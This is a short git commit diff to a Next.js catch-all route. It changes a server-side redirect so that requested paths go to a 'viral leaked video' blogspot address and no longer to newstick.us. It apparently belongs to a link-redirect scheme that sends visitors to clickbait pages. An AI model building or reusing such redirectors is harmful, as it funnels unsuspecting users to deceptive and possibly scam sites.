56ce20e97f22c6f06ae35ba0590fb38455f3e3d3
Umar Shahzad <135652972+umarshahzad77g@users.noreply.github.com>
2023-08-09 23:16:00 +0500

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://newstick.us/` + encodeURI(path as string)
+					`https://viralleakedvedio.blogspot.com/` + encodeURI(path as string)
 				}`,
 			},
 		};
